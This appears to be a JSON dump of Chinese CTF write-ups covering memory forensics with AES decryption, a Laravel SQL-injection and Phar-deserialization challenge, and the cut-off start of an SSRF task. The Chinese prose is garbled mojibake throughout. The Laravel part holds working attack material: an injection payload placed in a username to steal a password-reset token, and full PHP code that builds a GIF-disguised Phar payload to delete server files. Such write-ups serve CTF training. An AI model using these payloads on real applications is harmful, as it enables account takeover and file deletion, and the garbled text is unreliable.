C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System.Windows.Forms\\6c3df040b081b732b934702fa8149535\\System.Windows.Forms.ni.dll0x000007feec5b0000 0x9e000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\RichEd20.DLL0x000007fefbb90000 0x218000 0x2 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\WinSxS\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.7601.24280_none_145e10148b8de48e\\gdiplus.dll0x000007fefb890000 0x18000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\dwmapi.dll0x000007fefc130000 0x1f4000 0x3 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.18837_none_fa3b1e3d17594757\\comctl32.DLL0x000007fefdad0000 0xda000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\OLEAUT32.DLL0x000007fefcde0000 0x18000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\CRYPTSP.dll0x000007fefcae0000 0x47000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\rsaenh.dll0x000007fefd540000 0x14000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\RpcRtRemote.dll0x0000000074ef0000 0x8000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Users\\ALLES\\Desktop\\3\\Crypto.dll0x000007fefcf30000 0x22000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\bcrypt.dll å…¶ä¸­ç¡®å®æœ‰ä¸€ä¸ªCrypto.dllã€‚æˆ‘ä»¬ç”¨dlldumpå¯¼å‡ºæ¥åå‘ç°è¿˜æ˜¯ä¸ª.Netçš„åº”ç”¨ç¨‹åºé›†ã€‚ç»§ç»­æ‹–åˆ°dotPeekã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071using Microsoft.Win32.SafeHandles;using System;using System.IO;using System.Runtime.InteropServices;using System.Security.Cryptography;using System.Security.Principal;using System.Text;namespace someCrypto&#123; public class Crypto &#123; private SafeHandle handle = (SafeHandle) new SafeFileHandle(IntPtr.Zero, true); private byte[] byte_0; private byte[] byte_1; private bool disposed; public void Dispose() &#123; this.Dispose(true); GC.SuppressFinalize((object) this); &#125; protected virtual void Dispose(bool disposing) &#123; if (this.disposed) return; if (disposing) this.handle.Dispose(); this.disposed = true; &#125; private SymmetricAlgorithm function01() &#123; RijndaelManaged rijndaelManaged = new RijndaelManaged(); rijndaelManaged.KeySize = 256; rijndaelManaged.IV = this.byte_1; rijndaelManaged.Key = this.byte_0; return (SymmetricAlgorithm) rijndaelManaged; &#125; public byte[] function02(string string_0) &#123; SymmetricAlgorithm symmetricAlgorithm = this.function01(); MemoryStream memoryStream = new MemoryStream(); CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write); byte[] bytes = new UnicodeEncoding().GetBytes(string_0.PadRight(string_0.Length % 8, char.MinValue)); cryptoStream.Write(bytes, 0, bytes.Length); cryptoStream.FlushFinalBlock(); memoryStream.Position = 0L; byte[] array = memoryStream.ToArray(); string_0 = (string) null; cryptoStream.Close(); memoryStream.Close(); GC.Collect(); GC.WaitForPendingFinalizers(); return array; &#125; public void function03() &#123; byte[] binaryForm = new byte[28]; WindowsIdentity.GetCurrent().User.GetBinaryForm(binaryForm, 0); this.byte_1 = new byte[16]; Array.Copy((Array) binaryForm, 0, (Array) this.byte_1, 0, 16); this.byte_0 = new byte[32]; Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 0, 16); Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 16, 16); &#125; &#125;&#125; å¥½äº†ï¼ŒåŠ å¯†å‡½æ•°æœ‰äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦æ‰¾åˆ°çš„å¯†æ–‡å‘¢ï¼Ÿæ³¨æ„åˆ°2316ä¸»ç¨‹åºä½¿ç”¨äº†Base64è¿›è¡ŒåŠ å¯†ã€‚é‚£æˆ‘ä»¬åº”è¯¥å»å¯»æ‰¾Base64å­—ç¬¦ä¸²ã€‚åæ¥æˆ‘ä»¬åœ¨clipboardé‚£é‡Œç¿»å‡ºæ¥ä¸€æ®µBase64ï¼Œä½†å¾ˆä¸å¹¸çš„ï¼Œè¿™ä¸ªæ˜¯Flag1çš„Base64ã€‚ç„¶åæˆ‘ä»¬å¤§èƒ†çŒœæµ‹ä¸€ä¸‹2308å’Œ2316çš„å†…å­˜ä¸­åº”è¯¥è¿˜æ®‹ç•™æ•°æ®ï¼Œè¿™æ¬¡æˆ‘ä»¬ç”¨memdumpå‘½ä»¤ã€‚å¯¼å‡ºæ¥ågrep \"=\"ï¼Œæœç„¶å‘ç°ä¸€ä¸²ï¼šZuwJUgfmKzIMbo4F8agPy1MPLq+r7cAlDLowY+RT2wgp1uifc2TXeNH4bvbb2VqfK6r77SPHFrrMYR+GMGv8JGS87Tiybyi4LNNHQWnTR8LlGlSeHWWA9pydAXuJjSk8FzUFbqHOKqHc+bCtJ/4K2Q==ï¼Œé‚£æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹Crypto.dllçš„ä»£ç é€†å‘æ¨è¿™æ®µå¯†æ–‡å§ã€‚ function03()ä¸»è¦æ˜¯è·å–åˆ°äº†å½“å‰ç™»å½•ç”¨æˆ·çš„SIDï¼Œè½¬æˆäºŒè¿›åˆ¶å½¢å¼ï¼Œç„¶åå¡«å……äº†ä¸¤ä¸ªæ•°ç»„ã€‚è€Œfunction02()ä½¿ç”¨AESè¿›è¡ŒåŠ å¯†ï¼Œå°†ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«ç”¨åšIVå’ŒKeyã€‚ åŠ å¯†ç®—æ³•å·²çŸ¥ï¼Œä¸‹ä¸€æ­¥æ˜¯è·å¾—ç”¨æˆ·çš„SIDã€‚è¿™ä¸ªå¯ä»¥é€šè¿‡Volatilityçš„getsidså®Œæˆã€‚converter.exe (2316): S-1-5-21-2947568794-2193893069-2968809547-1000 (ALLES)ã€‚ä¸‹é¢æ˜¯å†™ç¨‹åºè§£å¯†äº†ã€‚é¦–å…ˆæ‹¿åˆ°AESçš„Keyå’ŒIVï¼Œä»¥åŠè¦çŸ¥é“é»˜è®¤çš„åŠ å¯†æ–¹å¼ã€‚è¿™ä¸ªå°±ç›´æ¥ç”¨C#å¥½äº†ï¼Œçœå¾—å†è½¬ã€‚ 12345678910111213141516171819202122232425262728using System;using System.Collections.Generic;using System.Linq;using System.Security.Principal;using System.Text;using System.Threading.Tasks;namespace ConsoleApp1&#123; class Program &#123; static byte[] byte_1; static byte[] byte_0; static void Main(string[] args) &#123; byte[] binaryForm = new byte[28]; SecurityIdentifier a=new SecurityIdentifier(&quot;S-1-5-21-2947568794-2193893069-2968809547-1000&quot;); a.GetBinaryForm(binaryForm, 0); byte_1 = new byte[16]; Array.Copy((Array)binaryForm, 0, (Array)byte_1, 0, 16); byte_0 = new byte[32]; Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 0, 16); Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 16, 16); Console.WriteLine(Convert.ToBase64String(byte_0)); Console.WriteLine(Convert.ToBase64String(byte_1)); &#125; &#125;&#125; å¾—åˆ°byte_0çš„Base64ï¼šmlSwr80mxIJLcPSw6AMAAJpUsK/NJsSCS3D0sOgDAAA=ï¼Œbyte_1çš„Base64ï¼šAQUAAAAAAAUVAAAAmlSwrw==ã€‚åŒæ—¶æ‹¿åˆ°AESçš„åŠ å¯†æ–¹å¼ä¸ºCBCã€‚ä¸‹é¢å°±æ˜¯è§£å¯†äº†ã€‚å®Œæ•´ç¨‹åºå¦‚ä¸‹ï¼ˆAESè§£å¯†æ˜¯ä»è¿™é‡ŒæŠ„çš„ï¼‰ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768using System;using System.Collections.Generic;using System.IO;using System.Linq;using System.Security.Cryptography;using System.Security.Principal;using System.Text;using System.Threading.Tasks;namespace ConsoleApp1&#123; class Program &#123; static byte[] byte_1; static byte[] byte_0; static void Main(string[] args) &#123; byte[] binaryForm = new byte[28]; SecurityIdentifier a=new SecurityIdentifier(&quot;S-1-5-21-2947568794-2193893069-2968809547-1000&quot;); a.GetBinaryForm(binaryForm, 0); byte_1 = new byte[16]; Array.Copy((Array)binaryForm, 0, (Array)byte_1, 0, 16); byte_0 = new byte[32]; Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 0, 16); Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 16, 16); Console.WriteLine(Convert.ToBase64String(byte_0)); Console.WriteLine(Convert.ToBase64String(byte_1)); RijndaelManaged rijndaelManaged = new RijndaelManaged(); rijndaelManaged.KeySize = 256; Console.WriteLine(rijndaelManaged.Mode); Console.WriteLine(DecryptStringFromBytes(Convert.FromBase64String(&quot;ZuwJUgfmKzIMbo4F8agPy1MPLq+r7cAlDLowY+RT2wgp1uifc2TXeNH4bvbb2VqfK6r77SPHFrrMYR+GMGv8JGS87Tiybyi4LNNHQWnTR8LlGlSeHWWA9pydAXuJjSk8FzUFbqHOKqHc+bCtJ/4K2Q==&quot;))); &#125; static string DecryptStringFromBytes(byte[] cipherText) &#123; // Declare the string used to hold // the decrypted text. string plaintext = null; // Create an RijndaelManaged object // with the specified key and IV. using (RijndaelManaged rijAlg = new RijndaelManaged()) &#123; rijAlg.Key = byte_0; rijAlg.IV = byte_1; // Create a decryptor to perform the stream transform. ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV); // Create the streams used for decryption. using (MemoryStream msDecrypt = new MemoryStream(cipherText)) &#123; using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) &#123; using (StreamReader srDecrypt = new StreamReader(csDecrypt)) &#123; plaintext = srDecrypt.ReadToEnd(); &#125; &#125; &#125; &#125; return plaintext; &#125; &#125;&#125; ç„¶åå°±æ‹¿åˆ°äº†æˆ‘ä»¬çš„ç¬¬äºŒä¸ªFlagï¼šALLES{50m3_f0r3n51k_50m3_r3v3r51ng_4nd_50m3_c2ypt0_fun}ã€‚ é‚£ä¹ˆï¼Œç¬¬ä¸‰ä¸ªå‘¢ï¼Ÿè¿›ç¨‹çœ‹äº†ï¼ŒDLLçœ‹äº†ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹æˆªå›¾å§ã€‚å“¦å¼ï¼Œexploreræ‰“å¼€äº†ä¸€ä¸ªçœ‹ä¼¼ä¹±ç çš„è·¯å¾„ï¼Ÿæˆ‘ä»¬ç”¨filescanä¹Ÿèƒ½æ‰¾åˆ°è¿™ä¸ªè·¯å¾„ã€‚0x000000003e6645a0 16 0 R--r-d \\Device\\HarddiskVolume2\\Program Files\\D9f\\gCFhd\\yxEUQSFyoHU1ybvQ0S9TOOwUWFCR+HWh+YicMXXJ2hzO39bjKEbONClpsoTzUtfuC86APEJGe46byt7fmJGBEkmrtktbMIZ5Mk4LnGFkyNVkAwEKm\\O7dnFs7JKPrXrI9Co8Z4ULFf1UzT1cK5wFiIONE\\0t33K+0.batã€‚æˆ‘ä»¬åŒæ—¶æœåˆ°äº†è·¯å¾„å’Œåé¢çš„æ–‡ä»¶ï¼Œå…ˆç”¨å¸¦æ–‡ä»¶åçš„è·¯å¾„è¯•è¯•ã€‚ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°ï¼ŒBase64æ²¡æœ‰\\ï¼Œä½†æ˜¯æœ‰/ï¼Œé‚£ä¹ˆå¤§èƒ†çŒœæµ‹ä¸€ä¸‹ä¸Šè¿°è·¯å¾„æ˜¯ä¸ªBase64ï¼šD9f/gCFhd/yxEUQSFyoHU1ybvQ0S9TOOwUWFCR+HWh+YicMXXJ2hzO39bjKEbONClpsoTzUtfuC86APEJGe46byt7fmJGBEkmrtktbMIZ5Mk4LnGFkyNVkAwEKm/O7dnFs7JKPrXrI9Co8Z4ULFf1UzT1cK5wFiIONE/0t33K+0ï¼Œä¸¢åˆ°ä¸Šé¢çš„ç¨‹åºï¼Œçœ‹ä¸€ä¸‹å‡ºä»€ä¹ˆç»“æœã€‚æŠ¥é”™äº†ï¼ŒBase64ä¸å…¨ï¼Œæˆ‘ä»¬åŠ ä¸ª=ï¼Œç„¶åå°±å¾—åˆ°äº†ç¬¬ä¸‰ä¸ªFlagï¼šALLES{0n3_f0r3n51k_tr345ur3_15_ly1ng_w1th1n_th3_5h1mc4ch3}ã€‚ flag{5fd6d1a0-ac6c-4140-a6ae-64cdda65a015}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"},{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"},{"name":"Forensic","slug":"Forensic","permalink":"http://tiaonmmn.github.io/tags/Forensic/"},{"name":"Windows","slug":"Windows","permalink":"http://tiaonmmn.github.io/tags/Windows/"},{"name":"Volatility","slug":"Volatility","permalink":"http://tiaonmmn.github.io/tags/Volatility/"},{"name":"SID","slug":"SID","permalink":"http://tiaonmmn.github.io/tags/SID/"}]},{"title":"BUUOJåˆ·é¢˜-Web-easy_Laravel","slug":"BUUOJåˆ·é¢˜-Web-easy-laravel","date":"2019-09-04T03:03:27.000Z","updated":"2019-12-10T12:15:12.597Z","comments":true,"path":"2019/09/04/BUUOJåˆ·é¢˜-Web-easy-laravel/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-laravel/","excerpt":"2018 æŠ¤ç½‘æ¯çš„Easy_laravelã€‚Laravelæ˜¯ä¸ªPHPå¼€å‘æ¡†æ¶ã€‚ æ‰“å¼€åç½‘é¡µæºç æç¤ºgithubä¸Šæœ‰æºç ã€‚ä½†æ˜¯åšé¢˜çš„æ—¶å€™æºç å·²ç»æ²¡äº†ï¼Œæ‰€ä»¥æˆ‘ä»ctftrainingä¸Šæ‹–äº†ä¸€ä»½ä¸‹æ¥ã€‚ å…ˆçœ‹ä¸€ä¸‹æ•°æ®åº“ã€‚database/factories/ModelFactory.phpä¸­è®°å½•Userçš„ä¿¡æ¯ï¼Œå‘ç°ç”¨æˆ·åå’Œemailå·²çŸ¥ï¼Œä½†æ˜¯å¯†ç æ˜¯éšæœºç”Ÿæˆçš„ã€‚çŒœæµ‹æˆ‘ä»¬è¦é€šè¿‡SQLæ³¨å…¥ç™»å½•ç®¡ç†å‘˜ç”¨æˆ·äº†ã€‚è·¯ç”±ä¿¡æ¯åœ¨routes/web.phpä¸­ï¼Œå¯¹åº”çš„Controlleråœ¨app/Http/Controllers/ä¸‹å¯¹åº”çš„PHPæ–‡ä»¶ã€‚Uploadå’ŒFlagåªæœ‰adminç”¨æˆ·å¯ä»¥è®¿é—®ã€‚","text":"2018 æŠ¤ç½‘æ¯çš„Easy_laravelã€‚Laravelæ˜¯ä¸ªPHPå¼€å‘æ¡†æ¶ã€‚ æ‰“å¼€åç½‘é¡µæºç æç¤ºgithubä¸Šæœ‰æºç ã€‚ä½†æ˜¯åšé¢˜çš„æ—¶å€™æºç å·²ç»æ²¡äº†ï¼Œæ‰€ä»¥æˆ‘ä»ctftrainingä¸Šæ‹–äº†ä¸€ä»½ä¸‹æ¥ã€‚ å…ˆçœ‹ä¸€ä¸‹æ•°æ®åº“ã€‚database/factories/ModelFactory.phpä¸­è®°å½•Userçš„ä¿¡æ¯ï¼Œå‘ç°ç”¨æˆ·åå’Œemailå·²çŸ¥ï¼Œä½†æ˜¯å¯†ç æ˜¯éšæœºç”Ÿæˆçš„ã€‚çŒœæµ‹æˆ‘ä»¬è¦é€šè¿‡SQLæ³¨å…¥ç™»å½•ç®¡ç†å‘˜ç”¨æˆ·äº†ã€‚è·¯ç”±ä¿¡æ¯åœ¨routes/web.phpä¸­ï¼Œå¯¹åº”çš„Controlleråœ¨app/Http/Controllers/ä¸‹å¯¹åº”çš„PHPæ–‡ä»¶ã€‚Uploadå’ŒFlagåªæœ‰adminç”¨æˆ·å¯ä»¥è®¿é—®ã€‚ NoteController.phpä¸­ä»£ç å¦‚ä¸‹ï¼š 123456public function index(Note $note)&#123; $username = Auth::user()-&gt;name; $notes = DB::select(&quot;SELECT * FROM `notes` WHERE `author`=&#x27;&#123;$username&#125;&#x27;&quot;); return view(&#x27;note&#x27;, compact(&#x27;notes&#x27;));&#125; æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚è€Œåœ¨app/Http/Controllers/Auth/RegisterController.phpä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ³¨å†Œç”¨æˆ·æ—¶çš„validatorå¯¹ç”¨æˆ·åï¼Œä»…åšäº†æœ€å¤§å­—ç¬¦æ•°255çš„é™åˆ¶ï¼Œæ²¡æœ‰è¿‡æ»¤ä»»ä½•ç¬¦å·ã€‚ä½†æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥å¾—åˆ°adminçš„å¯†ç ï¼Œå› ä¸ºè¢«bcryptè¿‡äº†ã€‚æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©è¿›è¡Œå¯†ç é‡ç½®ã€‚åœ¨password_resetsé‡Œå½“ç”¨æˆ·å‘å‡ºé‡ç½®å¯†ç çš„è¯·æ±‚æ—¶ä¼šè®°å½•ä¸‹tokenï¼Œè®¿é—®/password/reset/{token}å°±å¯ä»¥é‡ç½®å¯†ç äº†ã€‚ æˆ‘ä»¬æ³¨å†Œtest'union select 1,token,3,4,5 from password_resets where email='admin@qvq.im';ï¼Œæ³¨æ„åœ¨config/database.phpä¸­é¢˜ç›®æ˜¯ç”¨çš„æ˜¯SQLiteæ•°æ®åº“ï¼Œä¸èƒ½ä½¿ç”¨#ï¼Œè¦ç”¨;ã€‚ç„¶åæ‰“å¼€noteï¼Œå°±ä¼šå¼¹å‡ºtokenã€‚è®¿é—®/password/reset/{token}å°±å¯ä»¥é‡ç½®å¯†ç äº†ã€‚ ç™»é™†åç‚¹å‡»flagï¼Œå‘ç°å¼¹å‡ºno flagã€‚FlagController.phpé‡Œç¡®å®æœ‰è¯»flagçš„æ“ä½œã€‚æ€ä¹ˆå›äº‹ï¼ŸLaravelè‡ªå¸¦ä¸€å¥—æ¨¡æ¿æ¡†æ¶Bladeã€‚Bladeæ¨¡æ¿æœ‰æ¨¡æ¿ç¼“å­˜æœºåˆ¶ï¼Œé™¤éæœ‰ä¿®æ”¹ï¼Œå¦åˆ™ä¸ä¼šé‡æ–°ç”Ÿæˆã€‚é‚£å¤§èƒ†çŒœæµ‹ä¸€ä¸‹ï¼Œè¿™é¢˜çš„/flagé¡µé¢æ¨¡æ¿æ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•è®¿é—®çœŸæ­£çš„é¡µé¢ã€‚é‚£ä¸‹ä¸€ç›®æ ‡å°±æ˜¯æŠŠç¼“å­˜çš„æ–‡ä»¶åˆ é™¤æ‰ã€‚ æ¥çœ‹ä¸€ä¸‹ä¸Šä¼ æ–‡ä»¶ï¼Œå…è®¸å‡ ç§å›¾ç‰‡æ–‡ä»¶çš„åç¼€ï¼Œç„¶åå°±å°†æ–‡ä»¶ç§»åŠ¨åˆ°app/public/ä¸‹ï¼Œé—®é¢˜æ˜¯app/publicè¿™ä¸ªç›®å½•ä¸å…è®¸æˆ‘ä»¬è®¿é—®ã€‚é‚£æˆ‘ä»¬æ²¡åŠæ³•ä¸Šä¼ ä¸€ä¸ªwebshelläº†ã€‚ç„¶åå°±æƒ³åˆ°ï¼Œå¯ä¸å¯ä»¥Pharååºåˆ—åŒ–å‘¢ï¼Ÿcheckå‡½æ•°ä¸­ä½¿ç”¨äº†file_exists()ï¼Œä¼šå—Pharæ–‡ä»¶çš„å½±å“ï¼Œè€Œä¸”pathå’Œfilenameå®Œå…¨å¯æ§ï¼Œçœ‹æ¥å¯è¡Œã€‚é‚£æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‰¾ä¸€ä¸ªä¼šåˆ é™¤æ–‡ä»¶çš„ç±»-&gt;æ„é€ Pharæ–‡ä»¶-&gt;ä¸Šä¼ -&gt;è°ƒç”¨checkã€‚åˆ é™¤ç¼“å­˜æ¨¡æ¿æ–‡ä»¶ï¼Œé‡æ–°è®¿é—®/flagå³å¯å¾—åˆ°flagã€‚ æˆ‘ä»¬æœç´¢unlinkï¼Œç„¶ååœ¨vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.phpä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930&lt;?phpclass Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream&#123; public function __construct() &#123; $filePath = tempnam(sys_get_temp_dir(), &#x27;FileByteStream&#x27;); if ($filePath === false) &#123; throw new Swift_IoException(&#x27;Failed to retrieve temporary file name.&#x27;); &#125; parent::__construct($filePath, true); &#125; public function getContent() &#123; if (($content = file_get_contents($this-&gt;getPath())) === false) &#123; throw new Swift_IoException(&#x27;Failed to get temporary file content.&#x27;); &#125; return $content; &#125; public function __destruct() &#123; if (file_exists($this-&gt;getPath())) &#123; @unlink($this-&gt;getPath()); &#125; &#125;&#125; __destructä¸unlinkï¼Œå®Œå…¨ç¬¦åˆæˆ‘ä»¬çš„æ¡ä»¶ã€‚å› æ­¤å¯ä»¥ååºåˆ—åŒ–è¿™ä¸ªäº†ã€‚getPath()å‡½æ•°éœ€è¦çš„å‚æ•°æ˜¯_pathï¼Œå°†å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶åå³å¯ã€‚ä¸‹ä¸€æ­¥æ˜¯ç¼“å­˜çš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Ÿ ç½‘ä¸Šä¼¼ä¹æ²¡å¤ªå¤šèµ„æ–™ï¼Œé‚£æˆ‘ä»¬ç¿»ä»£ç å¥½äº†ã€‚vendor/laravel/framework/src/Illuminate/View/Compilers/BladeCompiler.phpä¸­æœ‰ä¸€æ®µä»£ç ï¼š 123456789101112public function compile($path = null)&#123; if ($path) &#123; $this-&gt;setPath($path); &#125; if (! is_null($this-&gt;cachePath)) &#123; $contents = $this-&gt;compileString($this-&gt;files-&gt;get($this-&gt;getPath())); $this-&gt;files-&gt;put($this-&gt;getCompiledPath($this-&gt;getPath()), $contents); &#125;&#125;è€ŒgetCompiledPathä»£ç ä¸ºï¼š 1234public function getCompiledPath($path)&#123; return $this-&gt;cachePath . &#x27;/&#x27; . sha1($path) . &#x27;.php&#x27;;&#125; çœ‹æ¥æˆ‘ä»¬å¯ä»¥è®¡ç®—æ¨¡æ¿çš„ç¼“å­˜æ–‡ä»¶åäº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„\\(pathç”¨çš„æ˜¯ç»å¯¹è·¯å¾„ã€‚æˆ‘ä»¬ç™»å½•ç®¡ç†å‘˜è´¦æˆ·ä»¥ånoteæœ‰ä¸€æ¡æç¤ºæˆ‘ä»¬ç”¨çš„æ˜¯Apacheé»˜è®¤é…ç½®ã€‚é‚£ä¹ˆæ–‡ä»¶è·¯å¾„å°±åœ¨/var/www/html/ä¸‹äº†ã€‚è¿™é‡Œ\\)pathåº”è¯¥æ˜¯/var/www/html/resources/views/auth/flag.blade.phpã€‚sha1ä¸º73eb5933be1eb2293500f4a74b45284fd453f0bbã€‚ æ‰€ä»¥payloadä¸ºï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpclass Swift_ByteStream_AbstractFilterableInputStream &#123; /** * Write sequence. */ protected $sequence = 0; /** * StreamFilters. * * @var Swift_StreamFilter[] */ private $filters = []; /** * A buffer for writing. */ private $writeBuffer = &#x27;&#x27;; /** * Bound streams. * * @var Swift_InputByteStream[] */ private $mirrors = [];&#125;class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream &#123; /** The internal pointer offset */ private $_offset = 0; /** The path to the file */ private $_path; /** The mode this file is opened in for writing */ private $_mode; /** A lazy-loaded resource handle for reading the file */ private $_reader; /** A lazy-loaded resource handle for writing the file */ private $_writer; /** If magic_quotes_runtime is on, this will be true */ private $_quotes = false; /** If stream is seekable true/false, or null if not known */ private $_seekable = null; /** * Create a new FileByteStream for $path. * * @param string $path * @param bool $writable if true */ public function __construct($path, $writable = false) &#123; $this-&gt;_path = $path; $this-&gt;_mode = $writable ? &#x27;w+b&#x27; : &#x27;rb&#x27;; if (function_exists(&#x27;get_magic_quotes_runtime&#x27;) &amp;&amp; @get_magic_quotes_runtime() == 1) &#123; $this-&gt;_quotes = true; &#125; &#125; /** * Get the complete path to the file. * * @return string */ public function getPath() &#123; return $this-&gt;_path; &#125;&#125;class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123; public function __construct() &#123; $filePath = &quot;/var/www/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;; parent::__construct($filePath, true); &#125; public function __destruct() &#123; if (file_exists($this-&gt;getPath())) &#123; @unlink($this-&gt;getPath()); &#125; &#125;&#125;$obj = new Swift_ByteStream_TemporaryFileByteStream();$p = new Phar(&#x27;./1.phar&#x27;, 0);$p-&gt;startBuffering();$p-&gt;setStub(&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);$p-&gt;setMetadata($obj);$p-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;text&#x27;);$p-&gt;stopBuffering();rename(&#x27;./1.phar&#x27;, &#x27;1.gif&#x27;);?&gt; ä¸Šä¼ ä»¥åcheckè¯¥æ–‡ä»¶ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦æ·»åŠ pathå‚æ•°ä¸º\"phar:///var/www/html/storage/app/public/1.gif\"ï¼Œæäº¤ä»¥åæ¨¡æ¿æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œæˆ‘ä»¬è®¿é—®/flagå°±ä¼šå‡ºç°åˆ·æ–°ä»¥åçš„é¡µé¢ï¼Œå³flagäº†ã€‚ flag{5e9a2127-047a-45f6-9772-6637a444fd8f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"},{"name":"Laravel","slug":"Laravel","permalink":"http://tiaonmmn.github.io/tags/Laravel/"},{"name":"Blade","slug":"Blade","permalink":"http://tiaonmmn.github.io/tags/Blade/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Pythonginx","slug":"BUUOJåˆ·é¢˜-Web-Pythonginx","date":"2019-09-03T10:44:44.000Z","updated":"2020-09-01T13:14:10.715Z","comments":true,"path":"2019/09/03/BUUOJåˆ·é¢˜-Web-Pythonginx/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-Pythonginx/","excerpt":"SUCTF 2019çš„Pythonginxã€‚ æ‰“å¼€é¡µé¢å°±ç»™äº†æºç ã€‚è¦æ±‚æäº¤çš„URLé‡Œç»è¿‡parse.urlparseçš„å¤„ç†ï¼Œhostnameä¸ºsuctf.ccï¼Œurlsplitå¤„ç†åç¬¬äºŒéƒ¨åˆ†è¿”å›çš„ä¹Ÿæ˜¯suctf.ccï¼Œç„¶åæŒ‰.åˆ†å‰²ï¼Œidnaç¼–ç å†è§£ç æˆUTF-8åå†ç»„åˆï¼Œè¦æ±‚urlparseçš„hostnameè¿˜æ˜¯suctf.ccï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡ŒSSRFã€‚","text":"SUCTF 2019çš„Pythonginxã€‚ æ‰“å¼€é¡µé¢å°±ç»™äº†æºç ã€‚è¦æ±‚æäº¤çš„URLé‡Œç»è¿‡parse.urlparseçš„å¤„ç†ï¼Œhostnameä¸ºsuctf.ccï¼Œurlsplitå¤„ç†åç¬¬äºŒéƒ¨åˆ†è¿”å›çš„ä¹Ÿæ˜¯suctf.ccï¼Œç„¶åæŒ‰.åˆ†å‰²ï¼Œidnaç¼–ç å†è§£ç æˆUTF-8åå†ç»„åˆï¼Œè¦æ±‚urlparseçš„hostnameè¿˜æ˜¯suctf.ccï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡ŒSSRFã€‚ è¿™é“é¢˜æ¶‰åŠåˆ°ä¸€ä¸ªæœ€è¿‘çš„è®®é¢˜è¿™ä¸ªå’Œè¿™ä¸ªã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯URLåŒ…å«Unicodeå­—ç¬¦æ—¶ä¼šè½¬æˆPunycodeï¼Œè½¬æ¢çš„æ—¶å€™ä¼šå¯¹Unicodeå­—ç¬¦é¢å¤–ç¼–ç 